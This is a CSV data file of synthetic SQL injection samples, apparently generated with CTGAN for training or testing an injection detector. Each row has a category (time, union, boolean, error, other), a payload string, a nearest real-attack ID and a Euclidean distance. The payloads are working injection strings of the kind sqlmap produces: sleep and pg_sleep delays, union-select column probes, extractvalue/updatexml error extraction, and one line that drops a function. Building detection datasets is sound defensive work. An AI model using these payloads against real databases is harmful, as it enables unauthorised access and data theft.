CTGAN_000582,attack,other,"1',  (  case when 2872  =  2872 then 1 else null end  )  ",nearest_attack_euclidean,R008965,3.865421745316191
CTGAN_000583,attack,time, (  7098  =  7098 and sleep  (  5   )    ) ,nearest_attack_euclidean,R005847,6.041882339550054
CTGAN_000584,attack,time,$  (  sleep 50  ) ,nearest_attack_euclidean,R000070,4.354551122514449
CTGAN_000585,attack,union,"-9175'   )    )    union all select 6174,6174,6174,6174--",nearest_attack_euclidean,R008923,3.3923093753154165
CTGAN_000586,attack,union,"1'||  (  select 'vixv' from dual where 7704  =  7704 union all select null,null,null,null,null--",nearest_attack_euclidean,R003188,7.674309914083166
CTGAN_000587,attack,error,"-6523"" or 4144  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4144  =  4144  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual  )   and ""bwrb"" like ""bwrb",nearest_attack_euclidean,R001510,4.053896946919301
CTGAN_000588,attack,boolean,1%' rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    and '%'  =  ',nearest_attack_euclidean,R002848,3.67225743690705
CTGAN_000589,attack,error,"1' in boolean mode  )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  #",nearest_attack_euclidean,R005056,4.4857433847779
CTGAN_000590,attack,union,"-5924' where 5415  =  5415 union all select 5415,5415,5415,5415,5415,5415#",nearest_attack_euclidean,R004709,2.965386731552273
CTGAN_000591,attack,other,1'||  (  select 'yezk' where 2097  =  2097,nearest_attack_euclidean,R006958,2.8442538072416537
CTGAN_000592,attack,union," select * from users where id  =  '1' or ||/1  =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000008,9.356912352348008
CTGAN_000593,attack,other,1'   )    )    as vdhw where 8858  =  8858 order by 1#,nearest_attack_euclidean,R002323,3.782069088658576
CTGAN_000594,attack,boolean,"1'   (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and 'hqqj'  =  'hqqj",nearest_attack_euclidean,R006485,3.671889727632722
CTGAN_000595,attack,other,"  (  select 1 from generate_series  (  9352,9352,case when   (  9352  =  9352  )   then 1 else 0 end  )   limit 1  )  ",nearest_attack_euclidean,R002435,3.382127941428304
CTGAN_000596,attack,time,"1'+  (  select 'wkcq' where 1020  =  1020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R006351,5.163108006269621
CTGAN_000597,attack,time,1' in boolean mode  )   and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003584,4.5197383156451565
CTGAN_000598,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,2.72929761129976
CTGAN_000599,attack,boolean,"-9996' or make_set  (  1237  =  7111,7111  )  ",nearest_attack_euclidean,R002606,3.8396266442483347
CTGAN_000600,attack,boolean,"1'   )    )    and elt  (  6847  =  5874,5874  )   and    (    (   'yspu'  =  'yspu",nearest_attack_euclidean,R002897,3.0899068582088676
CTGAN_000601,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R007425,3.815834527016133
CTGAN_000602,attack,union,"1   )    )    union all select null,null,null,null,null,null,null--",nearest_attack_euclidean,R002412,5.441355743042319
CTGAN_000603,attack,boolean,"1'  )   as uqkz where 8482  =  8482 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",nearest_attack_euclidean,R003027,3.941845052167535
CTGAN_000604,attack,other,1'||  (  select 'cfff' where 4994  =  4994,nearest_attack_euclidean,R001799,2.0247843752506616
CTGAN_000605,attack,time,1%'   )    )    and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and    (    (   '%'  =  ',nearest_attack_euclidean,R008178,4.067927546110181
CTGAN_000606,attack,time,"1"" where 3990  =  3990 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R004054,3.8663777539221145
CTGAN_000607,attack,error,"1%""   )    )     )   and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R008004,4.6730597669471345
CTGAN_000608,attack,boolean,"1 and make_set  (  8403  =  8403,8899  )  ",nearest_attack_euclidean,R002879,1.9589305636084802
CTGAN_000609,attack,union,"1%'   )    )    union all select null,null,null,null,null#",nearest_attack_euclidean,R000665,3.2090614572439637
CTGAN_000610,attack,union,"-6436' in boolean mode  )   union all select 7589,7589,7589,7589--",nearest_attack_euclidean,R007727,7.2836549478249575
CTGAN_000611,attack,other,"select count  (  *  )   from generate_series  (  1,5000000   )    )   ||'",nearest_attack_euclidean,R003441,3.9876276005323077
CTGAN_000612,attack,time,1' in boolean mode  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R007929,3.447210799790384
CTGAN_000613,attack,other,select   (  case when   (  9376  =  4521  )   then 1 else 9376*  (  select 9376 from master..sysdatabases  )   end  )  --,nearest_attack_euclidean,R006737,3.1882997049985167
CTGAN_000614,attack,error,"1' and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and 'ulep'  =  'ulep",nearest_attack_euclidean,R001062,4.01546704155971
CTGAN_000615,attack,time,1'||  (  select 'jmhb' where 1794  =  1794 or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R003533,4.600434578400936
CTGAN_000616,attack,union,"1"" where 4808  =  4808 union all select null,null,null,null,null,null,null#",nearest_attack_euclidean,R000989,2.811793671196139
CTGAN_000617,attack,boolean,-6030%'  )   or 3038  =  3038,nearest_attack_euclidean,R001832,2.1863042820396
CTGAN_000618,attack,other,1  )   where 7026  =  7026,nearest_attack_euclidean,R001112,3.177080318726991
CTGAN_000619,attack,union,"-1510""  )   as rqrv where 4507  =  4507 union all select 4507,4507,4507,4507,4507--",nearest_attack_euclidean,R001208,6.068388284873353
CTGAN_000620,attack,time,1   )    )    as uadn where 9588  =  9588 rlike sleep  (  5  )  #,nearest_attack_euclidean,R004073,2.8349187183744027
CTGAN_000621,attack,time,"1""  )   and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and   (  ""ppml""  =  ""ppml",nearest_attack_euclidean,R004804,4.590108301614109
CTGAN_000622,attack,other,"iif  (  3204  =  8489,3204,1/0  )  ",nearest_attack_euclidean,R000919,3.530889816494176
CTGAN_000623,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R004840,5.86078793996076
CTGAN_000624,attack,error,"1'  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and   (  'hbld'  =  'hbld",nearest_attack_euclidean,R008936,4.490226061494876
CTGAN_000625,attack,time,1   )    )    waitfor delay '0:0:5'--,nearest_attack_euclidean,R007356,2.6886246618549445
CTGAN_000626,attack,time,1' in boolean mode  )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   #,nearest_attack_euclidean,R006315,5.387296251148254
CTGAN_000627,attack,boolean,"1 and elt  (  3172  =  7243,7243  )  ",nearest_attack_euclidean,R008238,1.2265724879677136
CTGAN_000628,attack,other,select case when 7951  =  1147 then 1 else null end--,nearest_attack_euclidean,R002014,1.4998715784294159
CTGAN_000629,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,4.540434389280872
CTGAN_000630,attack,boolean,1'+  (  select enzd where 6046  =  6046 and   (  3020  =  3020  )  *6703  )  +',nearest_attack_euclidean,R003203,3.196367003429567
CTGAN_000631,attack,union,"-5998""  )   as gazd where 2814  =  2814 union all select 2814,2814,2814,2814,2814,2814,2814--",nearest_attack_euclidean,R007830,7.072630021800117
CTGAN_000632,attack,time,"1'   )    )     )   and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and    (    (     (  'wesl'  =  'wesl",nearest_attack_euclidean,R007878,5.271912512400799
CTGAN_000633,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R008837,2.660871548644428
CTGAN_000634,attack,union,"-3442' in boolean mode  )   union all select 6255,6255,6255,6255,6255#",nearest_attack_euclidean,R004910,4.1458080084906035
CTGAN_000635,attack,union,"1""  )   union all select null,null,null,null,null,null#",nearest_attack_euclidean,R006828,4.2335950379716625
CTGAN_000636,attack,other,"1,  (  select   (  case when   (  4828  =  2600  )   then 1 else 1/  (  select 0  )   end   )    )   ",nearest_attack_euclidean,R003764,2.582913618486692
CTGAN_000637,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.9904533202938244
CTGAN_000638,attack,time,"1' and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R006950,4.029826341613455
CTGAN_000639,attack,union,"-7741'  )   where 8271  =  8271 union all select 8271,8271,8271,8271,8271,8271,8271#",nearest_attack_euclidean,R003419,1.9785200301066557
CTGAN_000640,attack,time,1' or sleep  (  5  ) ,nearest_attack_euclidean,R005581,2.533233931330688
CTGAN_000641,attack,union," select * from users where id  =  '1' or @  (  1  )    =  1 union select 1,version  (    )   -- 1'",nearest_attack_euclidean,R000544,12.576499497899174
CTGAN_000642,attack,union,"-4406%' union all select 9599,9599,9599,9599#",nearest_attack_euclidean,R005961,3.1336148873570004
CTGAN_000643,attack,union,"1%""   )    )    union all select null,null,null,null,null,null,null,null,null#",nearest_attack_euclidean,R001840,3.6895219722144326
CTGAN_000644,attack,other,1'+  (  select 'kcix' where 1117  =  1117,nearest_attack_euclidean,R005989,3.534818663777279
CTGAN_000645,attack,boolean,"1%' and make_set  (  1227  =  5627,5627  )   and '%'  =  '",nearest_attack_euclidean,R008475,3.6495282924346184
CTGAN_000646,attack,boolean,"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and '%'  =  '",nearest_attack_euclidean,R004653,4.055347965060915
CTGAN_000647,attack,other,1   )    )    as mlpf where 7425  =  7425,nearest_attack_euclidean,R001024,1.9835617184699725
CTGAN_000648,attack,error,"1' in boolean mode  )   and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )  #",nearest_attack_euclidean,R007392,5.582109124958011
CTGAN_000649,attack,boolean,"1'  )   as tuhc where 4018  =  4018 or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",nearest_attack_euclidean,R006661,2.4452152148386053
CTGAN_000650,attack,error,"1""   )    )     )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and    (    (     (  ""dzse""  =  ""dzse",nearest_attack_euclidean,R002633,5.3362439372661905
CTGAN_000651,attack,other,1  )   where 1402  =  1402,nearest_attack_euclidean,R000891,0.7457770756717478
CTGAN_000652,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )  ",nearest_attack_euclidean,R001119,5.634315484362967
CTGAN_000653,attack,boolean,"1""   )    )     )   or char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and    (    (     (  ""urqg""  =  ""urqg",nearest_attack_euclidean,R003565,2.9169070553387675
CTGAN_000654,attack,other,1 where 9872  =  9872,nearest_attack_euclidean,R000894,1.2968523451652993
CTGAN_000655,attack,union,"-9076'+  (  select lqvj where 8551  =  8551 union all select 8551,8551,8551,8551--",nearest_attack_euclidean,R001714,3.5462685420453908
CTGAN_000656,attack,time,"1  )   as cnpv where 4902  =  4902 and elt  (  1210  =  1210,sleep  (  5   )    )   --",nearest_attack_euclidean,R006318,3.54040387252233
CTGAN_000657,attack,time,1  )   rlike sleep  (  5  )   and   (  5724  =  5724,nearest_attack_euclidean,R003320,3.3219885267534295
CTGAN_000658,attack,error,"1'   )    )     )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  'sbey'  =  'sbey",nearest_attack_euclidean,R006105,2.8223944164562447
CTGAN_000659,attack,error,"1'  )   or extractvalue  (  1297,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  1297  =  1297,1   )    )     )  ,0x717a767a71   )    )    and   (  'blnh' like 'blnh",nearest_attack_euclidean,R002672,1.4172467719475332
CTGAN_000660,attack,error,"1' and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and 'kudh' like 'kudh",nearest_attack_euclidean,R006790,4.202741951963303
CTGAN_000661,attack,boolean,"-6971"" or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and ""ifuh"" like ""ifuh",nearest_attack_euclidean,R004664,5.950422986111654
CTGAN_000662,attack,error,"1   )    )    as gcvw where 7363  =  7363 or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )  --",nearest_attack_euclidean,R003014,5.377208983818501
CTGAN_000663,attack,error,"1  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  6986  =  6986",nearest_attack_euclidean,R007062,2.9801419276670846
CTGAN_000664,attack,boolean,"1'+  (  select 'nmhy' where 2919  =  2919 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",nearest_attack_euclidean,R003109,2.4641649128275227
CTGAN_000665,attack,boolean, or 1 in   (  select @@version  )  --,nearest_attack_euclidean,R000101,5.632085074257045
CTGAN_000666,attack,boolean,"1' and make_set  (  9860  =  6956,6956  )   and 'toru'  =  'toru",nearest_attack_euclidean,R008937,2.4960495738789046
CTGAN_000667,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R002227,3.858611381339026
CTGAN_000668,attack,union,"1  )   where 3076  =  3076 union all select null,null,null,null,null--",nearest_attack_euclidean,R002382,2.698908512044582
CTGAN_000669,attack,time,"1%' and elt  (  1210  =  1210,sleep  (  5   )    )    and '%'  =  '",nearest_attack_euclidean,R004347,3.799794386296927
CTGAN_000670,attack,union,union select * from users where login   =   char ...,nearest_attack_euclidean,R000155,5.377953668391275
CTGAN_000671,attack,boolean,"1 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   # hkrp",nearest_attack_euclidean,R004579,3.005403129800936
CTGAN_000672,attack,union,"1""  )   where 3250  =  3250 union all select null#",nearest_attack_euclidean,R006798,3.4681129668354886
CTGAN_000673,attack,boolean,1'+  (  select rdwb where 2498  =  2498 and 3429  =  7639--,nearest_attack_euclidean,R004758,2.5207288316618284
CTGAN_000674,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R008718,3.8322947951273427
CTGAN_000675,attack,other,   (  select top 1,nearest_attack_euclidean,R000225,2.8583934613300377
CTGAN_000676,attack,union,"1""   )    )    as iqgd where 7611  =  7611 union all select null,null,null,null,null#",nearest_attack_euclidean,R008491,2.825459400746725
CTGAN_000677,attack,error,"1'||  (  select 'oyyu' where 6765  =  6765 or updatexml  (  1808,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666   )    )   ||'",nearest_attack_euclidean,R000874,3.0408943343051806
CTGAN_000678,attack,union,"-7940%""  )   union all select 2779,2779,2779,2779,2779,2779,2779,2779,2779,2779#",nearest_attack_euclidean,R007195,3.7462764018324277
CTGAN_000679,attack,time,"1%"" or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and ""%""  =  """,nearest_attack_euclidean,R006048,3.098229348655495
CTGAN_000680,attack,error,"1   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  4924  =  4924",nearest_attack_euclidean,R006246,4.514298541598078
CTGAN_000681,attack,time,1'   )    )     )   or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and    (    (     (  'ugrk'  =  'ugrk,nearest_attack_euclidean,R007947,3.981027119447756
CTGAN_000682,attack,boolean,"1""  )    (  select   (  case when   (  5451  =  5451  )   then regexp_substring  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,null  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   from information_schema.system_users  )   and   (  ""mrsl""  =  ""mrsl",nearest_attack_euclidean,R000984,3.341304456151016
CTGAN_000683,attack,other,"select count  (  *  )   from generate_series  (  1,5000000  )  -- gqkk",nearest_attack_euclidean,R007596,5.699867844877719
CTGAN_000684,attack,error,"1""  )   as fkco where 8877  =  8877 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  --",nearest_attack_euclidean,R003075,5.886445320214928
CTGAN_000685,attack,union,"-7111%"" union all select 6083,6083,6083,6083,6083,6083--",nearest_attack_euclidean,R004036,3.9017446327829166
CTGAN_000686,attack,time,"1'   )    )    as jxvv where 6593  =  6593 or elt  (  6272  =  6272,sleep  (  5   )    )   --",nearest_attack_euclidean,R002779,3.381495431919431
CTGAN_000687,attack,error,1'||  (  select 'hlxd' from dual where 2615  =  2615 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ||',nearest_attack_euclidean,R004288,3.1421671652129715
CTGAN_000688,attack,boolean,"1' in boolean mode  )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   #",nearest_attack_euclidean,R004876,6.133323449008365
CTGAN_000689,attack,error,1'   )    )     )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and    (    (     (  'eocx'  =  'eocx,nearest_attack_euclidean,R005245,2.0443847423730133
CTGAN_000690,attack,boolean,"1  )   where 8164  =  8164 or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R003116,3.7688746155828055
CTGAN_000691,attack,time,"1 or benchmark  (  10000000,MD5  (  1   )    )   #",nearest_attack_euclidean,R000163,3.405162128884738
CTGAN_000692,attack,error,1  )   and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and   (  6518  =  6518,nearest_attack_euclidean,R007927,5.8118539268518505
CTGAN_000693,attack,other,1'   )    )    as tley where 3539  =  3539,nearest_attack_euclidean,R003069,1.759557908068621
CTGAN_000694,attack,boolean,"x' AND userid IS NULL, --",nearest_attack_euclidean,R000292,3.3492598683527377
CTGAN_000695,attack,time,1%'   )    )     )   rlike sleep  (  5  )  #,nearest_attack_euclidean,R007578,3.5216854991949273
CTGAN_000696,attack,time,1   )    )     )   waitfor delay '0:0:5' and    (    (     (  3481  =  3481,nearest_attack_euclidean,R007430,3.2848412172768295
CTGAN_000697,attack,boolean,"1   )    )    as kgit where 1919  =  1919 and char  (  109  )  ||char  (  79  )  ||char  (  70  )  ||char  (  90  )    =  regexp_substring  (  repeat  (  right  (  char  (  5012  )  ,0  )  ,5000000000  )  ,null  )  --",nearest_attack_euclidean,R005232,5.540454084495821
CTGAN_000698,attack,other,1'  )   as mpsf where 3348  =  3348,nearest_attack_euclidean,R001672,0.7020004236753875
CTGAN_000699,attack,time,"1'+  (  select aahc where 5436  =  5436 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )     )  +'",nearest_attack_euclidean,R003993,6.836930888785805
CTGAN_000700,attack,error,"1' in boolean mode  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  #",nearest_attack_euclidean,R005531,4.776844667818301
CTGAN_000701,attack,time,select pg_sleep  (  5  )   and    (    (     (  9476  =  9476,nearest_attack_euclidean,R005888,3.7208861244431066
CTGAN_000702,attack,other,end# ckxq,nearest_attack_euclidean,R003895,3.1548224560051263
CTGAN_000703,attack,union,"1"" where 4183  =  4183 union all select null,null,null,null,null,null--",nearest_attack_euclidean,R004090,3.6336111758034875
CTGAN_000704,attack,time,1' or 6793  =    (  select 6793 from pg_sleep  (  5   )    )    and 'hokd'  =  'hokd,nearest_attack_euclidean,R002813,3.0209069760779403
CTGAN_000705,attack,time,1'   )    )    as qgyz where 1547  =  1547 and 8594  =    (  select 8594 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R001414,4.645277972830154
CTGAN_000706,attack,error,"1'+  (  select vohg where 6383  =  6383 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",nearest_attack_euclidean,R007553,25.157316158119425
CTGAN_000707,attack,time,"1""  )   as gjlv where 1983  =  1983 and sleep  (  5  )  #",nearest_attack_euclidean,R003581,2.318631409412738
CTGAN_000708,attack,error,"1'   )    )    and extractvalue  (  7982,concat  (  0x5c,0x7171706a71,  (  select   (  elt  (  7982  =  7982,1   )    )     )  ,0x717a767a71   )    )    and    (    (   'mwyu'  =  'mwyu",nearest_attack_euclidean,R000867,2.7205167165243087
CTGAN_000709,attack,error,"1'||  (  select 'adiv' from dual where 9842  =  9842 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   ||'",nearest_attack_euclidean,R003996,4.405704248498318
CTGAN_000710,attack,union,"-9808' in boolean mode  )   union all select 2528,2528,2528,2528,2528,2528,2528--",nearest_attack_euclidean,R007483,2.5581257399926547
CTGAN_000711,attack,union,"-3566' where 3641  =  3641 union all select 3641,3641,3641,3641,3641#",nearest_attack_euclidean,R003218,2.405906277421031
CTGAN_000712,attack,boolean,"1%""   )    )     )   or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R007366,4.339513585095853
CTGAN_000713,attack,other,select   (  case when   (  3365  =  6236  )   then 3365 else 1/  (  select 0  )   end  )  --,nearest_attack_euclidean,R001344,4.345703232875412
CTGAN_000714,attack,union,"-6097%'   )    )    union all select 3990,3990,3990,3990,3990,3990--",nearest_attack_euclidean,R005182,4.772682190047419
CTGAN_000715,attack,union,"-6680%""   )    )    union all select 3719,3719,3719,3719,3719,3719,3719,3719,3719--",nearest_attack_euclidean,R007940,2.661196315579898
CTGAN_000716,attack,error,"1%'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  '%'  =  '",nearest_attack_euclidean,R001548,5.4080339375242685
CTGAN_000717,attack,error,"1' in boolean mode  )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   #",nearest_attack_euclidean,R008406,2.704170771372549
CTGAN_000718,attack,union,"-9596  )   where 3425  =  3425 union all select 3425,3425,3425,3425,3425,3425#",nearest_attack_euclidean,R001752,4.417048770842031
CTGAN_000719,attack,other,"  (  select   (  case when   (  1938  =  1938  )   then dbms_pipe.receive_message  (  chr  (  118  )  ||chr  (  118  )  ||chr  (  112  )  ||chr  (  76  )  ,5  )   else 1938 end  )   from dual  )  ",nearest_attack_euclidean,R006148,8.190928158144013
CTGAN_000720,attack,boolean,1 and 8398  =  1891-- naov,nearest_attack_euclidean,R006638,1.8326225287778892
CTGAN_000721,attack,error,"1%""   )    )     )   and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R003731,3.3631073709753565
CTGAN_000722,attack,other,""" or """" """,nearest_attack_euclidean,R000286,6.577466016716894
CTGAN_000723,attack,other,"1,  (  select 9100  =    (  'qqpjq'||  (  select case 9100 when 9100 then 1 else 0 end from rdb$database  )  ||'qzvzq'   )    )   ",nearest_attack_euclidean,R007006,3.8482821919546013
CTGAN_000724,attack,boolean,"1%""   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R002598,6.602071712576849
CTGAN_000725,attack,union,"1' where 4039  =  4039 union all select null,null,null,null,null,null,null,null--",nearest_attack_euclidean,R006152,6.157799396102733
CTGAN_000726,attack,other,1'  )   as pudv where 2609  =  2609,nearest_attack_euclidean,R002866,1.7298325261505196
CTGAN_000727,attack,boolean,1'   )    )    as cyom where 2318  =  2318 and 7533  =  7533--,nearest_attack_euclidean,R006279,3.6733482942786297
CTGAN_000728,attack,other,if  (  8858  =  5680  )   select 8858 else drop function pyuo--,nearest_attack_euclidean,R000726,2.467238770012933
CTGAN_000729,attack,boolean,"1%""   )    )    and 9254  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R008285,3.082019858330843
